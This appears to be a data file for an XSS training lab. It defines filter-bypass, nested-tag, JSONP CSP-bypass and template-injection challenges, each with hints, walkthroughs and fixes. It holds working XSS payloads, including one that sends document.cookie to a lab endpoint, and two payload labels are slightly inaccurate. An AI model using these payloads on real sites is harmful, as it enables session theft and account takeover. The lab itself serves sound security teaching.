export const BYPASS = [
  {
    id: 'bypass-tag-blacklist',
    title: 'Blacklist bypass: <script> only is never enough',
    category: 'bypass',
    difficulty: 'apprentice',
    app: 'Nimbus Support',
    tags: ['blacklist', 'filter', 'event handlers'],
    summary: 'The filter deletes <script> tags and considers the job done. Every other element with an event handler still works.',
    scenario:
      'After a security review, Nimbus added a regex that removes <script>…</script> from submitted content. It runs on input and on output. Attackers rarely need <script> at all: dozens of elements execute JavaScript from an event handler.',
    goal: 'Execute JavaScript even though <script> tags are stripped.',
    hints: [
      'The filter only knows about the script element. Think about other elements that react to events.',
      'A broken image fires onerror without any user interaction.',
      'Try <svg>, <details open ontoggle>, <video>, <body onload> — the list is long.',
    ],
    payloads: [
      { label: 'Broken image', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'SVG', code: '<svg onload=alert(document.domain)>' },
      { label: 'No user interaction needed', code: '<details open ontoggle=alert(document.domain)>' },
      { label: 'Encoding the tag to dodge the regex', code: '<scr<script>ipt>alert(document.domain)</script>' },
    ],
    walkthrough: [
      { t: 'Confirm the filter', d: 'Submit <script>alert(1)</script>. The message comes back with the tag removed.' },
      { t: 'Find another executor', d: 'Submit <img src=x onerror=alert(document.domain)>. Nothing in the filter matches: an img is not a script.' },
      { t: 'Observe', d: 'The image fails, onerror fires, the dialog shows the lab hostname.' },
      { t: 'Draw the lesson', d: 'Every blocklist is a list of things you remembered. There are hundreds of ways to reach the JavaScript parser; you cannot enumerate them all.' },
    ],
    why:
      'HTML has many executable surfaces: event handlers, javascript: URLs, SVG animation events, iframe srcdoc, meta refresh, form actions, and more. Filtering one tag leaves the rest of the language available.',
    fix: {
      text: 'Do not blocklist. Encode output for the context, and if you must accept HTML, use an allow-list sanitiser such as DOMPurify that only keeps known-safe tags and attributes, then keep output encoding as a second layer.',
      code: "import DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(userHtml, {\n  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],\n  ALLOWED_ATTR: ['href', 'title'],\n  ALLOW_DATA_ATTR: false,\n});",
    },
  },
  {
    id: 'bypass-nested-tag',
    title: 'Sanitiser bypass: rebuilding a tag from its own removal',
    category: 'bypass',
    difficulty: 'practitioner',
    app: 'PixelPress',
    tags: ['non-recursive filter', 'nested tags', 'rebuild'],
    summary: 'The sanitiser removes the literal string "<script>" once, without repeating. Nest one inside itself and the removal recreates it.',
    scenario:
      'PixelPress uses a hand-written sanitiser: it deletes every occurrence of <script> and every on*= handler, then writes the result into the page. It looks thorough — quotes are handled, handlers are gone — but the replacement is not applied recursively, so the input can assemble a new tag out of the pieces the filter leaves behind.',
    goal: 'Get a working script element past a filter that removes <script> and all on* handlers.',
    hints: [
      'If the filter deletes the whole tag <script>, what happens to <scr<script>ipt>?',
      'Write it out by hand: delete the inner <script> from that string and read what is left.',
      'Do the same for the closing tag, then put your code between them.',
    ],
    payloads: [
      { label: 'Nested tag rebuild', code: '<scr<script>ipt>alert(document.domain)</scr</script>ipt>' },
      { label: 'Same technique for a broken filter on the closing tag', code: '<scr<script>ipt>alert(document.domain)</script>' },
    ],
    walkthrough: [
      { t: 'Read the filter', d: 'The lab removes the literal tags <script> and </script> plus every on*= handler in one non-recursive pass over the string.' },
      { t: 'Test it', d: 'Submit <img src=x onerror=alert(1)>. The handler disappears; the tag survives but is inert. Submit <script>alert(1)</script> and the tags vanish.' },
      { t: 'Build the payload', d: 'Send <scr<script>ipt>alert(document.domain)</scr</script>ipt>. The filter deletes the inner <script> and </script>, and the leftovers concatenate into a real <script>…</script> pair.' },
      { t: 'Explain the root cause', d: 'String replacement is not parsing. Any transformation that deletes a token from inside itself can be used to synthesise that token — the fix is to parse and rebuild, never regex-replace over attacker text.' },
    ],
    why:
      'Filters that remove substrings operate on text, while browsers operate on a parse tree. Whenever the sanitiser\'s transformation is not idempotent, the attacker can use the transformation itself as a construction primitive. The same class covers "strip javascript: once" (java<script>script:) and double-encoded payloads.',
    fix: {
      text: 'Never sanitise HTML with regular expressions. Parse with a maintained allow-list sanitiser that re-serialises a tree (DOMPurify), or better, do not accept HTML at all and encode at output.',
      code: "// broken\nconst clean = input.replace(/<\\/?script>/gi, '');\n\n// correct: parse-based allow-list\nconst clean = DOMPurify.sanitize(input);",
    },
  },
  {
    id: 'bypass-csp-jsonp',
    title: 'CSP bypass through a JSONP endpoint',
    category: 'bypass',
    difficulty: 'expert',
    app: 'Nimbus Cloud',
    tags: ['CSP', 'JSONP', 'script-src self'],
    summary: 'A strict script-src blocks inline script, but the app still ships a JSONP endpoint that turns any callback name into executed code.',
    scenario:
      'Nimbus Cloud deployed Content-Security-Policy: script-src \'self\' and considered XSS solved. The legacy /api/jsonp?cb= endpoint still exists for an old widget: it returns cb({"ok":true}). Since the JSONP URL is same-origin, CSP allows it — and the callback name is executed as code.',
    goal: 'Execute JavaScript while the page CSP forbids inline script.',
    hints: [
      "The CSP is script-src 'self'. You cannot add an inline <script>, but you can load a same-origin script.",
      'Look for an endpoint that reflects a callback name into JavaScript. /api/jsonp?cb=NAME returns NAME({...}).',
      'Set the callback to alert: the response becomes alert({"ok":true}) and executes.',
    ],
    payloads: [
      { label: 'Inline attempt (blocked by CSP)', code: '<script>alert(document.domain)</script>' },
      { label: 'JSONP gadget (allowed, same origin)', code: '<script src="/api/jsonp?cb=alert"></script>' },
      { label: 'Exfiltrate with a data-carrying callback', code: '<script src="/api/jsonp?cb=fetch"></script>' },
    ],
    walkthrough: [
      { t: 'Watch CSP block you', d: 'Submit the inline <script> payload. The console reports a CSP violation and nothing runs — the policy is doing its job.' },
      { t: 'Hunt for gadgets', d: 'CSP restricts where script may come from, not what existing same-origin endpoints return. The JSONP endpoint is such a gadget.' },
      { t: 'Use it', d: 'Submit <script src="/api/jsonp?cb=alert"></script>. The script element is allowed because it is \'self\', and the response body is JavaScript that calls alert.' },
      { t: 'Understand the limit of CSP', d: 'CSP is a mitigation, not a fix. Any JSONP endpoint, open redirect to a script-mapped host, or user-uploaded JS file makes it bypassable — and \'self\' is only as safe as every script the origin serves.' },
    ],
    why:
      'script-src \'self\' trusts everything your origin returns. JSONP deliberately returns executable JavaScript with an attacker-chosen function name, so the endpoint is an XSS primitive that CSP permits. Modern deployments remove JSONP and use CORS + fetch with a nonce-based CSP.',
    fix: {
      text: 'Replace JSONP with CORS fetch. If you keep CSP, use nonces or hashes plus strict-dynamic, forbid inline event handlers, and remove every endpoint that reflects a callback name. Add object-src \'none\', base-uri \'none\' and a report-only rollout.',
      code: "Content-Security-Policy:\n  default-src 'none';\n  script-src 'nonce-<random>' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'none';\n  frame-ancestors 'none'",
    },
  },
  {
    id: 'bypass-csti',
    title: 'Client-side template injection (CSTI)',
    category: 'bypass',
    difficulty: 'expert',
    app: 'PixelPress',
    tags: ['template injection', 'CSTI', 'expression evaluation'],
    summary: 'A "personalised greeting" template evaluates what the user types as an expression. That is not echo, it is code.',
    scenario:
      'PixelPress lets authors write greeting templates like "Hello {{ user.name }}". A small client-side engine evaluates the expressions inside {{ }} against a scope object using new Function. That makes the template a programming language that the attacker can write into — the client-side sibling of SSTI.',
    goal: 'Execute JavaScript through the template expression, then try escaping the sandboxed scope.',
    hints: [
      'Anything inside {{ }} is evaluated as a JavaScript expression, not printed.',
      'Start simple: an expression that calls alert.',
      'If a scope property shadows what you need, climb out through constructor.constructor, which is always Function.',
    ],
    payloads: [
      { label: 'Direct expression', code: '{{alert(document.domain)}}' },
      { label: 'Climb to Function when scope shadows globals', code: "{{constructor.constructor('alert(document.domain)')()}}" },
      { label: 'Exfiltration', code: "{{fetch('/api/attack/log?lab=bypass-csti&src=template&d='+encodeURIComponent(document.cookie))}}" },
    ],
    walkthrough: [
      { t: 'Confirm it is an evaluator', d: 'Type {{1+1}} in the template box. The output is 2, not the literal text — the engine evaluates expressions.' },
      { t: 'Call a function', d: 'Enter {{alert(document.domain)}}. The expression is compiled with new Function and runs with page privileges.' },
      { t: 'Break the scope', d: 'Templates usually evaluate inside a scope object. constructor.constructor is a reference to Function that survives most scope tricks, so you can build code strings even when globals are shadowed.' },
      { t: 'Where this appears in the wild', d: 'AngularJS expression sandbox escapes ({{constructor.constructor(...)()}}), Vue template compilation of user strings, Handlebars helpers, and any "let users customise the message" feature implemented with eval or new Function.' },
    ],
    why:
      'Template engines are compilers. If user data is compiled as a template instead of passed as data, the user writes code. Escaping HTML is irrelevant: the parser being abused is the template language, and sandboxes around expression evaluation have a long history of escapes.',
    fix: {
      text: 'Never compile user input as a template. Treat the template as code you ship and the data as values. If user-defined expressions are a product requirement, evaluate them in an isolated worker/realm with no DOM or network access.',
      code: "// vulnerable\nconst out = tpl.replace(/\\{\\{(.+?)\\}\\}/g, (_, e) => new Function('s', `with(s){return (${e})}`)(scope));\n\n// fixed: data only, no evaluation\nconst out = tpl.replace(/\\{\\{\\s*([\\w.]+)\\s*\\}\\}/g, (_, path) => escapeHtml(get(scope, path) ?? ''));",
    },
  },
];
